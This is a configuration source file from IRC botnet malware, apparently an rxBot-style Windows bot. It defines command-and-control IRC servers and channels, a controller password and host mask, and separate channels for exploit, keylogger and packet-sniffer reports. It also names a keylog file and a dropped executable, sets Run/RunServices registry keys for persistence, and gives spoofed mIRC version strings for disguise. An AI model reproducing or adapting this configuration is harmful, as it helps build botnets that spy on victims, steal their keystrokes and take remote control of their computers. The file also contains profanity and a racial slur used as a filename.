int port = 8080;			
int port2 = 8080;			
int socks4port = 3128;		
int tftpport = 69;			
int httpport = 80;		
int rloginport = 513;		
BOOL topiccmd = TRUE;		
BOOL rndfilename = FALSE;	
BOOL AutoStart = TRUE;		
char prefix = '.';			
int maxrand = 9;				
int nicktype = COUNTRYNICK;		
BOOL nickprefix = TRUE;			/* Nick Uptime prefix: [30]Bot-109348 */

#ifdef DEBUG_LOGGING
char logfile[]="c:\\system.txt";
#endif

#ifndef NO_CRYPT

#else 

char botid[] = "mysUrx";							
char version[] = "mysUrx";					
char password[] = "fuck";				
char server[] = "nathan.stjohnspark.net";				
char serverpass[] = "";							
char channel[] = "#newmsn";						
char chanpass[] = "pass";				
char server2[] = "bleh.darkacidonline.us";							
char channel2[] = "#newmsn";							
char chanpass2[] = "pass";								
char filename[] = "run.exe";						
char keylogfile[] = "jigaboo.txt";					
char valuename[] = "Windows Executable";					
char nickconst[] = "";								
char cntrypt1[] = "[";							
char cntrypt2[] = "]";								
char szLocalPayloadFile[]="sysconfig.dat";		
char modeonconn[] = "-x";							
char exploitchan[] = "#newmsn-s";						
char keylogchan[] = "#keylog";						
char psniffchan[] = "#sniff";						

char *authost[] = {
	"*@fuck"
};

	char *versionlist[] = {
		"mIRC v6.12 Khaled Mardam-Bey",
		"mIRC v6.03 Khaled Mardam-Bey",
		"eggdrop v1.6.15",
		"eggdrop v1.6.13",
	};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
	char key[16] = "admg0wn3zt5h63156ssh145t6s0stfu2326"; 
#endif
